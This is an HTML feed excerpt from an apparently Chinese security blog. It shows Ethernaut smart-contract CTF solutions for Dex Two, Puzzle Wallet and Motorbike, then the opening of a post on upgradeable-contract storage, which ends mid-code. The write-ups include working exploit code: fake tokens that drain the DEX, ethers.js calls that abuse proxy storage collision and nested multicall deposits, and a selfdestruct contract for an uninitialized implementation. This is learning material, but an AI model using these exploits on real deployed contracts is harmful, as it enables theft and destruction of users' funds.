balanceOf(address token, address account) public view returns (uint)&#123;</span><br><span class="line">    return IERC20(token).balanceOf(account);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SwappableTokenTwo is ERC20 &#123;</span><br><span class="line">  address private _dex;</span><br><span class="line">  constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) &#123;</span><br><span class="line">        _mint(msg.sender, initialSupply);</span><br><span class="line">        _dex = dexInstance;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function approve(address owner, address spender, uint256 amount) public &#123;</span><br><span class="line">    require(owner != _dex, &quot;InvalidApprover&quot;);</span><br><span class="line">    super._approve(owner, spender, amount);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>与<code>Dex</code>相比，<code>Dex2</code>去掉了<code>require((from == token1 &amp;&amp; to == token2) || (from == token2 &amp;&amp; to == token1), &quot;Invalid tokens&quot;);</code>，交换 token 还与<code>Dex</code>相同，同时，题目要求将合约中的两种 token 消耗完即可通过这道题目。</p><p>因此我们的思路是再写一个token，将合约中的 token 全部转移到我们创建的 token 中。</p><p>首先部署两个用来转移中间 token 的恶意合约，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">import &quot;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.2.0/contracts/token/ERC20/IERC20.sol&quot;;</span><br><span class="line">import &quot;https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.2.0/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Mytoken is ERC20 &#123;</span><br><span class="line">    address public target;</span><br><span class="line">  constructor(string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) &#123;</span><br><span class="line">        _mint(msg.sender, initialSupply);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在部署时<code>INITIALSUPPLY</code>设置为 200，部署完成后 approve 给题目地址 100 个token，并转给题目地址100个token，所以题目合约和恶意合约在初始状态下各拥有100个恶意合约的token。</p><p>然后执行以下代码：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.approve(player,<span class="number">1000</span>)</span><br><span class="line"><span class="keyword">await</span> contract.approve(contract.address,<span class="number">1000</span>)</span><br><span class="line">token1 = (<span class="keyword">await</span> contract.token1())</span><br><span class="line">token2 = (<span class="keyword">await</span> contract.token2())</span><br><span class="line"></span><br><span class="line"><span class="comment">// mytoken1和mytoken2分别对应2个部署的恶意合约的地址</span></span><br><span class="line">mytoken1 = <span class="string">&#x27;0x02c68949EB02dd68e2B16e9c415cd70A2343409F&#x27;</span></span><br><span class="line">mytoken2 = <span class="string">&#x27;0x14E246478B8Fcb00011bd5239cE2c4573a6acD3e&#x27;</span></span><br><span class="line"><span class="keyword">await</span> contract.swap(mytoken1,token1,<span class="number">100</span>)</span><br><span class="line"><span class="keyword">await</span> contract.swap(mytoken2,token2,<span class="number">100</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="24-Puzzle-Wallet"><a href="#24-Puzzle-Wallet" class="headerlink" title="24. Puzzle Wallet"></a>24. Puzzle Wallet</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line">pragma experimental ABIEncoderV2;</span><br><span class="line"></span><br><span class="line">import &quot;../helpers/UpgradeableProxy-08.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract PuzzleProxy is UpgradeableProxy &#123;</span><br><span class="line">    address public pendingAdmin;</span><br><span class="line">    address public admin;</span><br><span class="line"></span><br><span class="line">    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) &#123;</span><br><span class="line">        admin = _admin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyAdmin &#123;</span><br><span class="line">      require(msg.sender == admin, &quot;Caller is not the admin&quot;);</span><br><span class="line">      _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function proposeNewAdmin(address _newAdmin) external &#123;</span><br><span class="line">        pendingAdmin = _newAdmin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approveNewAdmin(address _expectedAdmin) external onlyAdmin &#123;</span><br><span class="line">        require(pendingAdmin == _expectedAdmin, &quot;Expected new admin by the current admin is not the pending admin&quot;);</span><br><span class="line">        admin = pendingAdmin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function upgradeTo(address _newImplementation) external onlyAdmin &#123;</span><br><span class="line">        _upgradeTo(_newImplementation);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract PuzzleWallet &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    uint256 public maxBalance;</span><br><span class="line">    mapping(address =&gt; bool) public whitelisted;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    function init(uint256 _maxBalance) public &#123;</span><br><span class="line">        require(maxBalance == 0, &quot;Already initialized&quot;);</span><br><span class="line">        maxBalance = _maxBalance;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyWhitelisted &#123;</span><br><span class="line">        require(whitelisted[msg.sender], &quot;Not whitelisted&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted &#123;</span><br><span class="line">      require(address(this).balance == 0, &quot;Contract balance is not 0&quot;);</span><br><span class="line">      maxBalance = _maxBalance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function addToWhitelist(address addr) external &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;Not the owner&quot;);</span><br><span class="line">        whitelisted[addr] = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit() external payable onlyWhitelisted &#123;</span><br><span class="line">      require(address(this).balance &lt;= maxBalance, &quot;Max balance reached&quot;);</span><br><span class="line">      balances[msg.sender] += msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted &#123;</span><br><span class="line">        require(balances[msg.sender] &gt;= value, &quot;Insufficient balance&quot;);</span><br><span class="line">        balances[msg.sender] -= value;</span><br><span class="line">        (bool success, ) = to.call&#123; value: value &#125;(data);</span><br><span class="line">        require(success, &quot;Execution failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function multicall(bytes[] calldata data) external payable onlyWhitelisted &#123;</span><br><span class="line">        bool depositCalled = false;</span><br><span class="line">        for (uint256 i = 0; i &lt; data.length; i++) &#123;</span><br><span class="line">            bytes memory _data = data[i];</span><br><span class="line">            bytes4 selector;</span><br><span class="line">            assembly &#123;</span><br><span class="line">                selector := mload(add(_data, 32))</span><br><span class="line">            &#125;</span><br><span class="line">            if (selector == this.deposit.selector) &#123;</span><br><span class="line">                require(!depositCalled, &quot;Deposit can only be called once&quot;);</span><br><span class="line">                // Protect against reusing msg.value</span><br><span class="line">                depositCalled = true;</span><br><span class="line">            &#125;</span><br><span class="line">            (bool success, ) = address(this).delegatecall(data[i]);</span><br><span class="line">            require(success, &quot;Error while delegating call&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题目要求我们成为<code>PuzzleProxy</code>合约的 admin，<code>PuzzleProxy</code>合约继承了<code>UpgradeableProxy</code>，我们可以通过先执行<code>proposeNewAdmin</code>让自己的地址成为<code>pendingAdmin</code>，然后再执行<code>approveNewAdmin</code>来成为admin。但问题在于，<code>approveNewAdmin</code>有<code>onlyAdmin，所以需要对</code>onlyAdmin`进行绕过。</p><p>在控制台获取到的地址为<code>PuzzleWallet</code>合约。在该合约中，除了<code>addToWhitelist</code>函数，其他的都要求我们先把自己的地址加入whitelist才能调用，然而<code>addToWhitelist</code>又要求msg.sender必须等于owner，而 owner 又是<code>PuzzleProxy</code>合约的地址。分析到这里，这道题似乎无法下手。但是在题目中提示了<code>delegatecall</code>，首先画一下合约的内存结构图：</p><p><strong>PuzzlePorxy：</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">=============================================</span><br><span class="line"> unused (12 byte)  | pendingAdmin (20 bytes)         slot 0     </span><br><span class="line">=============================================</span><br><span class="line"> unused (12 bytes) | admin (20 bytes)                slot 1</span><br><span class="line">=============================================</span><br></pre></td></tr></table></figure><p><strong>PuzzleWallet:</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">=============================================</span><br><span class="line">unused (12 bytes)  |  owner (20 bytes)                slot 0</span><br><span class="line">=============================================</span><br><span class="line">           maxBalance(32 bytes)                       slot 1</span><br><span class="line">=============================================</span><br><span class="line">         whitelisted (32 bytes)                       slot 2</span><br><span class="line">=============================================</span><br><span class="line">balances (32 bytes)                       slot 3</span><br><span class="line">=============================================</span><br></pre></td></tr></table></figure><p>我们如果可以在<code>PuzzleWallet</code>合约中使用<code>delegatecall</code>调用<code>proposeNewAdmin</code>，就可以对 slot 0的内容进行修改，即修改owner，当owner修改为自己后就可以控制<code>PuzzleWallet</code>合约。</p><p>利用 etherJs 实例化合约调用<code>proposeNewAdmin</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> <span class="keyword">import</span>(<span class="string">&#x27;https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.esm.js&#x27;</span>);</span><br><span class="line">ethers = _ethers;</span><br><span class="line"><span class="keyword">const</span> provider = <span class="keyword">new</span> ethers.providers.Web3Provider(<span class="built_in">window</span>.ethereum);</span><br><span class="line"><span class="keyword">const</span> signer = provider.getSigner();</span><br><span class="line"><span class="comment">//实例化合约</span></span><br><span class="line"><span class="keyword">const</span> contractEthers = <span class="keyword">new</span> ethers.Contract(instance, [<span class="string">&#x27;function proposeNewAdmin(address)&#x27;</span>], signer);</span><br><span class="line"><span class="comment">//调用proposeNewAdmin</span></span><br><span class="line"><span class="keyword">await</span> contractEthers.proposeNewAdmin(player);</span><br><span class="line"><span class="comment">//查看owner</span></span><br><span class="line"><span class="keyword">await</span> contract.owner()</span><br></pre></td></tr></table></figure><blockquote><p><strong>解释：为什么可以从PuzzleProxy 合约调用 proposeNewAdmin() 函数</strong></p><p>这两个合约使用逻辑合约的 ABI 创建了 Web3 合约对象，但使用代理合约的地址，即可以与逻辑合约进行交互。当用逻辑合约函数的数据调用代理合约时，由于该函数在代理中不存在，它的回退函数运行并通过<code>delegatecall</code>将调用重定向到逻辑合约。因此，控制台中的合约就是代理合约，如果要调用 proposeNewAdmin()，就需要调用控制台中的合约，但不可以使用在控制台定义的ABI中的函数，这里的ABI是逻辑ABI。</p></blockquote><p>在成为 owner 后调用<code>addToWhitelist</code>，将 player 添加到白名单中</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.addToWhitelist(player);</span><br><span class="line"><span class="keyword">await</span> contract.whitelisted(player);</span><br></pre></td></tr></table></figure><p><img src="/image/Ethernaut.assets/image-20230115185459052.png" alt="image-20230115185459052"></p><p>我们的最终目的是成为<code>PuzzleProxy</code>合约的owner，因此可以利用相同的漏洞在<code>PuzzleWallet</code>中使用 <code>delegatecall</code>修改<code>maxBalance</code>，由于在<code>init</code>函数中对 maxBalance 的值有限制，我们只能调用<code>setMaxBalance</code>函数，而要调用这个函数，就需要使合约中的余额清零。由合约代码可知，<code>execute</code>取款函数在取款时检查了我们的余额，我们只能取出自己存入的余额，而合约初始就有0.001ether，只靠这个函数是无法让合约余额清0的。需要使用<code>multicall</code>函数。</p><p><code>multicall</code>函数允许用户将多个调用一起处理以达到节省 gas 的目的，该函数通过一下代码检查是否是第一次调用<code>deposit</code>函数，通过判断目前执行的方法的函数选择器是否与deposit的函数选择器一致，因此我们只能调用一次<code>deposit</code>函数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (selector == this.deposit.selector) &#123;</span><br><span class="line">                require(!depositCalled, &quot;Deposit can only be called once&quot;);</span><br><span class="line">                // Protect against reusing msg.value</span><br><span class="line">                depositCalled = true;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>但是<code>multicall</code>并不会检查自己，由于<code>multicall</code>可以执行任意代码，因此可以用<code>multicall</code>来包装<code>deposit</code>来绕过对函数选择器的检查，所以通过<code>multicall</code>调用<code>deposit</code>和<code>multicall(deposit)</code>，在实际只发送0.001 ether的情况下，合约实际的余额<code>balanace</code>为0.002 ether，此时<code>balances[player]</code>和合约余额数值相等，因此再执行一次<code>execute</code>全部提款即可。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> interface = <span class="keyword">new</span> ethers.utils.Interface([</span><br><span class="line">  <span class="string">&#x27;function deposit()&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;function multicall(bytes[])&#x27;</span></span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二个参数是 multicall 的参数组，其中 multicall (bytes[]) 的第一个参数本身就是一个参数组。这就是为什么有两个参数。</span></span><br><span class="line"><span class="keyword">const</span> payload = interface.encodeFunctionData(<span class="string">&#x27;multicall&#x27;</span>, [[interface.getSighash(<span class="string">&#x27;deposit()&#x27;</span>)]]);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* payload explanation:</span></span><br><span class="line"><span class="comment">0xac9650d8: 这是 multicall 的任数签名。后面有五个 32 字节的段（为方方便起见，提供了从头的偏移量（十六进制））</span></span><br><span class="line"><span class="comment">000: 0000000000000000000000000000000000000000000000000000000000000020</span></span><br><span class="line"><span class="comment">020: 0000000000000000000000000000000000000000000000000000000000000001</span></span><br><span class="line"><span class="comment">040: 0000000000000000000000000000000000000000000000000000000000000020</span></span><br><span class="line"><span class="comment">060: 0000000000000000000000000000000000000000000000000000000000000004</span></span><br><span class="line"><span class="comment">080: d0e30db000000000000000000000000000000000000000000000000000000000</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">000: 由于 bytes[] 具有动态长度，因此该段指示指定位 bytes[] 数据的偏移量。</span></span><br><span class="line"><span class="comment">020: bytes[]是一个变长数组，所以这段表示数组的长度。</span></span><br><span class="line"><span class="comment">040: 数组中的数据（byte）也是动态的，因此该段包含确定字节数据的偏移量</span></span><br><span class="line"><span class="comment">060: bytes是一个变长数组，所以这一段表示数组的长度</span></span><br><span class="line"><span class="comment">080: 最后，实际数据。这是 deposit() 的 4 字节函数选择器</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//将两个 multicall(deposit())作为参数传递为 multicall，发送的金额为 0.001 eth，此次交易将执行两次 deposit，将 balances 设置为 0.002 eth</span></span><br><span class="line"><span class="keyword">await</span> contract.multicall([payload, payload], &#123;<span class="attr">value</span>: toWei(<span class="string">&#x27;0.001&#x27;</span>)&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用 execute 将合约中的余额消耗尽，这里的 data 不需要实际内容</span></span><br><span class="line"><span class="keyword">await</span> contract.execute(player, toWei(<span class="string">&#x27;0.002&#x27;</span>),</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后利用相同的方法调用<code>await contract.setMaxBalance(player);</code>，修改<code>PuzzleProxy</code>合约中的 slot 1，即将 owner 修改为自己。</p><h3 id="25-Motorbike"><a href="#25-Motorbike" class="headerlink" title="25. Motorbike"></a>25. Motorbike</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity &lt;0.7.0;</span><br><span class="line"></span><br><span class="line">import &quot;openzeppelin-contracts-06/utils/Address.sol&quot;;</span><br><span class="line">import &quot;openzeppelin-contracts-06/proxy/Initializable.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Motorbike &#123;</span><br><span class="line">    // keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1</span><br><span class="line">    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;</span><br><span class="line">    </span><br><span class="line">    struct AddressSlot &#123;</span><br><span class="line">        address value;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.</span><br><span class="line">    constructor(address _logic) public &#123;</span><br><span class="line">        require(Address.isContract(_logic), &quot;ERC1967: new implementation is not a contract&quot;);</span><br><span class="line">        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;</span><br><span class="line">        (bool success,) = _logic.delegatecall(</span><br><span class="line">            abi.encodeWithSignature(&quot;initialize()&quot;)</span><br><span class="line">        );</span><br><span class="line">        require(success, &quot;Call failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Delegates the current call to `implementation`.</span><br><span class="line">    function _delegate(address implementation) internal virtual &#123;</span><br><span class="line">        // solhint-disable-next-line no-inline-assembly</span><br><span class="line">        assembly &#123;</span><br><span class="line">            calldatacopy(0, 0, calldatasize())</span><br><span class="line">            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)</span><br><span class="line">            returndatacopy(0, 0, returndatasize())</span><br><span class="line">            switch result</span><br><span class="line">            case 0 &#123; revert(0, returndatasize()) &#125;</span><br><span class="line">            default &#123; return(0, returndatasize()) &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Fallback function that delegates calls to the address returned by `_implementation()`. </span><br><span class="line">    // Will run if no other function in the contract matches the call data</span><br><span class="line">    fallback () external payable virtual &#123;</span><br><span class="line">        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Returns an `AddressSlot` with member `value` located at `slot`.</span><br><span class="line">    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) &#123;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            r_slot := slot</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Engine is Initializable &#123;</span><br><span class="line">    // keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1</span><br><span class="line">    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;</span><br><span class="line"></span><br><span class="line">    address public upgrader;</span><br><span class="line">    uint256 public horsePower;</span><br><span class="line"></span><br><span class="line">    struct AddressSlot &#123;</span><br><span class="line">        address value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function initialize() external initializer &#123;</span><br><span class="line">        horsePower = 1000;</span><br><span class="line">        upgrader = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Upgrade the implementation of the proxy to `newImplementation`</span><br><span class="line">    // subsequently execute the function call</span><br><span class="line">    function upgradeToAndCall(address newImplementation, bytes memory data) external payable &#123;</span><br><span class="line">        _authorizeUpgrade();</span><br><span class="line">        _upgradeToAndCall(newImplementation, data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Restrict to upgrader role</span><br><span class="line">    function _authorizeUpgrade() internal view &#123;</span><br><span class="line">        require(msg.sender == upgrader, &quot;Can&#x27;t upgrade&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.</span><br><span class="line">    function _upgradeToAndCall(address newImplementation,bytes memory data) internal &#123;</span><br><span class="line">        // Initial upgrade and setup call</span><br><span class="line">        _setImplementation(newImplementation);</span><br><span class="line">        if (data.length &gt; 0) &#123;</span><br><span class="line">            (bool success,) = newImplementation.delegatecall(data);</span><br><span class="line">            require(success, &quot;Call failed&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // Stores a new address in the EIP1967 implementation slot.</span><br><span class="line">    function _setImplementation(address newImplementation) private &#123;</span><br><span class="line">        require(Address.isContract(newImplementation), &quot;ERC1967: new implementation is not a contract&quot;);</span><br><span class="line">        </span><br><span class="line">        AddressSlot storage r;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            r_slot := _IMPLEMENTATION_SLOT</span><br><span class="line">        &#125;</span><br><span class="line">        r.value = newImplementation;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题算是上面题目的简单版本，最终的目的是让合约执行<code>selfdestruct</code>函数自毁，在获得新实例后，在控制台获取的合约地址实际是<code>Motorbike</code>的地址，而<code>Engine</code>合约则被部署在了<code>_IMPLEMENTATION_SLOT</code>上。</p><p><code>Engine</code>中的该<code>initialize()</code>函数是一个伪构造函数，它允许代理合约在升级到新的实现逻辑合约时执行类似构造函数的操作。由于<code>constructor</code>代理不能调用实现的 ，因此该<code>initialize</code>函数取代了构造函数的位置。但是，请记住，这<code>initialize</code>对 Solidity 没有特殊意义——它只是可升级合约中常用的命名约定。就 Solidity 而言，<code>initialize</code>这只是另一个功能。</p><p>在获取到实例地址后先读取出<code>Enginr</code>的地址：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> MotorBikeAddr = <span class="string">&quot;0x341f91ADf4e053242098f321D0aB9845d127F4A7&quot;</span></span><br><span class="line"><span class="keyword">const</span> slot = <span class="string">&quot;0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc&quot;</span></span><br><span class="line"><span class="keyword">const</span> EngineAddr = <span class="keyword">await</span> provider.getStorageAt(MotorBikeAddr, slot)</span><br><span class="line"><span class="comment">// 0x000000000000000000000000a75ad15322afa9a93a3dcb10b80accac24a7a3a3</span></span><br></pre></td></tr></table></figure><p>然后再读区一下<code>Enginr</code>合约中的<code>upgrader和horsePower</code>变量的内容。</p><p><img src="/image/Ethernaut.assets/image-20230223164319975.png" alt="image-20230223164319975"></p><p>他们的内容都为 <code>0</code>，说明此时<code>Engine</code>合约还没有执行<code>initialize()</code>函数，因此，我们可以通过外部调用<code>Engine</code>合约的<code>initialize()</code>函数，来让<code>Engine</code>合约的upgrader变成我们的地址。</p><p>又由于<code>upgradeToAndCall</code>函数调用了<code>_upgradeToAndCall</code>函数，而<code>_upgradeToAndCall</code>内部执行了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(bool success,) = newImplementation.delegatecall(data);</span><br></pre></td></tr></table></figure><p>这里<code>newImplementation</code>和<code>data</code>都是完全可控的，因此在这里设置<code>newImplementation</code>为我们自定义的恶意合约地址，<code>data</code>设定为自毁函数的<code>函数选择器</code>值，由于<code>delegatecall</code>是在本函数的上下文执行的，因此执行远程函数代码中的<code>selfdestruct</code>时，这个合约就会自毁，从而达到题目条件</p><p>攻击代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.7.0;</span><br><span class="line"></span><br><span class="line">contract exp &#123;</span><br><span class="line">    address target;</span><br><span class="line">    </span><br><span class="line">    constructor(address _addr) public &#123;</span><br><span class="line">        target = _addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function step1_BeUpgrader() public &#123;</span><br><span class="line">        (bool succ, ) = target.call(abi.encodeWithSignature(&quot;initialize()&quot;));</span><br><span class="line">        require(succ,&quot;step1 failed!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function step2_Exp() public &#123;</span><br><span class="line">        Bomb bomb = new Bomb();</span><br><span class="line">        (bool succ, ) = target.call(abi.encodeWithSignature(&quot;upgradeToAndCall(address,bytes)&quot;,address(bomb),abi.encodeWithSignature(&quot;destruct()&quot;)));</span><br><span class="line">        require(succ,&quot;step2 failed!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Bomb &#123;</span><br><span class="line">    function destruct()  external &#123;</span><br><span class="line">        selfdestruct(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;1-Fallback&quot;&gt;&lt;a href=&quot;#1-Fallback&quot; class=&quot;headerlink&quot; title=&quot;1. Fallback&quot;&gt;&lt;/a&gt;1. Fallback&lt;/h3&gt;&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;ta</summary>
      
    
    
    
    
    <category term="智能合约 CTF" scheme="https://banana69.site/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-CTF/"/>
    
  </entry>
  
  <entry>
    <title>Upgradeable Contract 可升级合约</title>
    <link href="https://banana69.site/2023/02/21/Upgradeable-Contract/"/>
    <id>https://banana69.site/2023/02/21/Upgradeable-Contract/</id>
    <published>2023-02-21T11:09:45.000Z</published>
    <updated>2023-02-27T07:54:53.811Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h3><p>区块链的不可更改性与传统的软件开发过程有根本性的冲突，在传统的软件开发过程中，代码被不断地更新以修复错误和增加新的功能。在智能合约可以通过一些技术在不改变代码的条件下增加新的功能。主要是通过<code>deldegatecall</code>和回退函数<code>fallback</code>实现。</p><h3 id="0x02-代码和存储"><a href="#0x02-代码和存储" class="headerlink" title="0x02 代码和存储"></a>0x02 代码和存储</h3><p><img src="/image/Upgradeable-Contract.assets/20230106095207.png" alt="Foundry test on command"></p><p>我们将智能合约在执行过程中的EVM状态分为持久性和易失性状态。持久性状态在不同的交易中都会被记住，而易失性状态在交易执行后会立即被遗忘。EVM代码和存储都是持久性的，而堆栈、内存、程序计数器和剩余gas的值都是易失性的。在这里，我们将关注点放在代码和存储部分，他们对理解可升级合约来说很重要。</p><p>虽然代码和存储都是持久的，但两者之间有一个根本的区别。存储是可变的，可以被修改，而代码一旦部署就不可改变。为此，代码与存储在内存的只读部分分开保存。这种分离使得<code>delegatecall</code>指令成为可能，它使用一个合约的代码和另一个合约的存储</p><p>区分存储和内存是很重要的。存储器是持久的，它将32个字节的地址映射到32个字节的值，这些值被称为slot。另一方面，内存是不稳定的，它将32字节的地址映射为1字节1字节的值。换句话说，存储是按字处理（一个字是32字节），而内存是按字节处理的。</p><p>在 Solidity 中，任何在合约层声明的变量都被映射到一个或多个slot。例如，考虑下面的合约：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Token &#123;</span><br><span class="line">  address immutable owner; //immutable 表示不可变，不占用 slot</span><br><span class="line">  uint256 public totalSupply;</span><br><span class="line">  mapping(address =&gt; uint256) public balanceOf;</span><br><span class="line"></span><br><span class="line">  constructor() &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function mint(address user, uint256 amount) external &#123;</span><br><span class="line">    require(msg.sender == owner, &quot;Only owner is allowed to mint&quot;);</span><br><span class="line">    balanceOf[user] += amount;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一个变量被映射到slot 0，第二个被映射到slot 1 [注1]，下图为这个合约的存储结构：</p><blockquote><p>注1：若占用少于32字节的变量可以存储在同一个slot中。例如，一个slot可以包含两个类型为<code>uint128</code>的变量。</p></blockquote><img src="/image/Upgradeable-Contract.assets/40.png" alt="Foundry方案" style="zoom:73%;" /><p>像 <code>address </code>和 <code>uint256 </code>这样的简单类型的值最多需要32个字节，因此可以放入一个存储槽，但对于形如 <code>mapping(address =&gt; uint) a;</code> 的映射类型变量，就无法简单仿照值类型按顺序储存了。对于映射，其会根据上节提到的规则占据位置 <code>p</code> 处的一个插槽，但该插槽不会被真正使用。映射中的键 <code>k</code> 所对应的值会位于 <code>keccak256(k . p)</code>， 其中 <code>.</code> 是连接符。如果该值同时是一个非基本类型，则将 <code>keccak256(k . p)</code> 作为偏移量来找到具体的位置。</p><p>如果我们想访问<code>balanceOf[addr]</code>，相应的槽被计算出来，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">keccak(</span><br><span class="line">  leftPadTo32Bytes(addr) ++ leftPadTo32Bytes(1)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>我们把key（这里是：<code>addr</code>）和映射的槽号（这里是：1），把它们都零扩展到32字节，把它们连接起来（用++表示），最后计算结果的keccak哈希值。下面的 Foundry 测试展示了如何用 Solidity 来表达:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract StorageTest is Test &#123;</span><br><span class="line">    address Alice = makeAddr(&quot;Alice&quot;);</span><br><span class="line"></span><br><span class="line">    function testLoadBalance() public &#123;</span><br><span class="line">        Token t = new Token(&quot;Hi&quot;);</span><br><span class="line">        t.mint(Alice, 5 ether);</span><br><span class="line"></span><br><span class="line">        // Compute the slot at which Alice&#x27;s balance is stored in the Token contract</span><br><span class="line">        bytes32 aliceBalanceSlot = keccak256(</span><br><span class="line">            abi.encodePacked(uint256(uint160(Alice)), uint256(1))</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        // Now load Alice&#x27;s balance</span><br><span class="line">        uint256 aliceBalance = uint256(vm.load(address(t), 